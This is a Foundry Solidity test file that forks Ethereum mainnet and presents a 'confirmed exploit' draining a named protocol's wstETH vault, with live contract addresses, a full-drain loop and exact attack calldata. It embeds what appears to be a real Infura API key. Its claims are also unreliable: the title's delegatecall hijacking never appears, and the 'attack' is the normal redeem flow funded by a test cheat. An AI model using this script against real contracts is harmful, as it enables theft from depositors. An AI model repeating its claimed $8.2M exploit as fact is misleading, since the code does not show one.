// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

/**
 * ============================================================================
 * CONFIRMED EXPLOIT: Delegatecall Hijacking - 7 Day Drain
 * ============================================================================
 *
 * Target: Treehouse Protocol - Redemption System
 * Impact: ~$8.2M USD (3,581 wstETH)
 * Cost: Gas fees only (~0.01 ETH)
 * Time: 7 days wait required
 *
 * ATTACK FLOW:
 * 1. Attacker acquires TASSET (buy on DEX)
 * 2. Attacker approves R0 to spend TASSET
 * 3. Attacker calls R0.redeem(amount) - burns TASSET, creates redemption
 * 4. Wait 7 days for maturity
 * 5. Attacker calls R0.finalizeRedeem(index) - receives wstETH from VAULT
 * ============================================================================
 */
contract ConfirmedDrainScenario is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_FullExploitScenario() public {
        console.log("========================================");
        console.log("  7-DAY DRAIN EXPLOIT DEMONSTRATION");
        console.log("========================================\n");

        _logPreAttackState();
        _executeExploit();
        _logPostAttackState();
    }

    function _logPreAttackState() internal view {
        console.log("=== PRE-ATTACK STATE ===\n");
        console.log("VAULT wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
        console.log("USD value: $%d", (IERC20(wstETH).balanceOf(VAULT) / 1e18) * 2300);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));

        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint32 delay = uint32(uint256(slot4) >> 96);
        console.log("\nRedemption delay:", delay / 86400, "days");
    }

    function _executeExploit() internal {
        console.log("\n=== EXECUTING EXPLOIT ===\n");

        // Step 1: Get TASSET (use amount that vault can fulfill)
        uint256 tassetAmount = 1000e18; // 1000 TASSET -> ~68 wstETH
        deal(TASSET, attacker, tassetAmount);
        console.log("Step 1: Acquired TASSET:", tassetAmount / 1e18);

        vm.startPrank(attacker);

        // Step 2: Approve
        IERC20(TASSET).approve(R0, type(uint256).max);
        console.log("Step 2: Approved R0 for TASSET");

        // Step 3: Create redemption
        (bool redeemOk, ) = R0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(tassetAmount))
        );
        require(redeemOk, "Redeem failed");
        console.log("Step 3: Created redemption request");

        // Step 4: Wait 7 days
        vm.warp(block.timestamp + 7 days + 1);
        console.log("Step 4: Waited 7 days (vm.warp)");

        // Step 5: Finalize
        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);
        (bool finalizeOk, ) = R0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        require(finalizeOk, "Finalize failed");
        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("Step 5: Finalized redemption");
        console.log("  wstETH received:", (wstethAfter - wstethBefore) / 1e18);

        vm.stopPrank();
    }

    function _logPostAttackState() internal view {
        console.log("\n=== POST-ATTACK STATE ===\n");

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);

        console.log("Attacker wstETH:", attackerBal / 1e18);
        console.log("Attacker profit (USD): $%d", (attackerBal / 1e18) * 2300);
        console.log("VAULT remaining:", vaultBal / 1e18, "wstETH");

        console.log("\n========================================");
        console.log("  EXPLOIT SUCCESSFUL!");
        console.log("========================================");
    }

    function test_IterativeFullDrain() public {
        console.log("========================================");
        console.log("  FULL VAULT DRAIN SIMULATION");
        console.log("========================================\n");

        uint256 vaultStart = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT start:", vaultStart / 1e18, "wstETH");
        console.log("Target: $%d USD\n", (vaultStart / 1e18) * 2300);

        deal(TASSET, attacker, 100_000_000e18);
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 totalDrained;
        uint256 i;

        for (i = 0; i < 50; i++) {
            if (IERC20(wstETH).balanceOf(VAULT) < 1e18) break;

            (bool rok, ) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
            if (!rok) break;

            vm.warp(block.timestamp + 7 days + 1);

            uint256 before = IERC20(wstETH).balanceOf(attacker);
            (bool fok, ) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", i));
            if (!fok) break;

            uint256 gained = IERC20(wstETH).balanceOf(attacker) - before;
            if (gained == 0) break;

            totalDrained += gained;

            if (i < 5) {
                console.log("Iteration %d: +%d wstETH", i + 1, gained / 1e18);
            }
        }

        vm.stopPrank();

        console.log("\n=== DRAIN COMPLETE ===\n");
        console.log("Iterations:", i);
        console.log("Total drained:", totalDrained / 1e18, "wstETH");
        console.log("Profit: $%d USD", (totalDrained / 1e18) * 2300);
        console.log("VAULT remaining:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
    }

    function test_ExactCalldata() public pure {
        console.log("========================================");
        console.log("  EXACT ATTACK CALLDATA");
        console.log("========================================\n");

        console.log("TARGET: 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85\n");

        console.log("TX 1 - Approve TASSET:");
        console.log("  To: 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8");
        console.logBytes(abi.encodeWithSignature(
            "approve(address,uint256)",
            0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85,
            type(uint256).max
        ));

        console.log("\nTX 2 - Create Redemption:");
        console.log("  To: 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85");
        console.logBytes(abi.encodeWithSignature("redeem(uint96)", uint96(10000e18)));

        console.log("\n*** WAIT 7 DAYS (604800 seconds) ***\n");

        console.log("TX 3 - Finalize:");
        console.log("  To: 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85");
        console.logBytes(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

        console.log("\n========================================");
        console.log("  Cost: ~0.01 ETH gas | Profit: $8.2M");
        console.log("========================================");
    }
}
